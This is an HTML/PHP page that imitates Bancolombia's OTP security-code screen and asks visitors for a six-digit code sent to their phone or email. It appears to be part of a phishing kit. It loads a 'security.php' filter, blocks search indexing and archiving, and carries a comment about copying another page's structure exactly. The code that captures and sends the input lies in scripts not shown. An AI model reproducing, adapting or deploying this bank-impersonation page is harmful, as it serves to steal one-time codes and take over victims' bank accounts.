<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Código de seguridad Bancolombia.">
    <title>Código de seguridad — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/otp.css">
</head>
<body class="otp-page">

    <div class="otp-shell">
        <header class="header-top">
            <div class="header-content">
                <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="logo-header">
            </div>
        </header>

        <main class="contenido-principal">
            <h1 class="titulo-principal">Codigo OTP</h1>

            <section class="center-stage">
                <div class="contenedor-principal">
                    <div class="form-container">
                        <div class="form-box">
                            <p class="descripcion">
                                Ingresa el Código OTP enviado a tu número celular o correo electrónico registrado.
                            </p>

                            <!-- Mensaje de error -->
                            <div id="mensaje-error">
                                El código ingresado es incorrecto. Por favor verificalo e intenta nuevamente.
                            </div>

                            <!-- ESTRUCTURA EXACTAMENTE IGUAL A DINÁMICA -->
                            <div class="password-wrapper">
                                <input type="tel" id="clave" maxlength="6" class="real-password-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                                <div class="password-slots">
                                    <div class="password-slot"></div>
                                    <div class="password-slot"></div>
                                    <div class="password-slot"></div>
                                    <div class="password-slot"></div>
                                    <div class="password-slot"></div>
                                    <div class="password-slot"></div>
                                </div>
                            </div>

                            <div class="botones">
                                <button type="button" class="btn-volver btn-volver--hidden" id="btnVolverOtp">Volver</button>
                                <button type="button" id="btnContinuarOtp" class="btn-continuar inactivo">continuar</button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </main>

        <footer class="footer-container">
            <img src="assets/images/trazo-escritorio.svg" alt="" class="lineas-form lineas-form-desktop">
            <img src="assets/images/trazo-movil.svg" alt="" class="lineas-form lineas-form-mobile">

            <div class="vigilado-logo">
                <img src="assets/images/estrella-hola.svg" alt="Vigilado">
            </div>

            <div class="info-footer">
                <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span> | Fecha y hora: <span id="fecha-hora">Cargando...</span></div>
            </div>
        </footer>
    </div>

    <!-- SCRIPTS -->
    <script src="assets/js/shared/page-common.js"></script>
    <script src="assets/js/pages/otp.js"></script>
</body>
</html>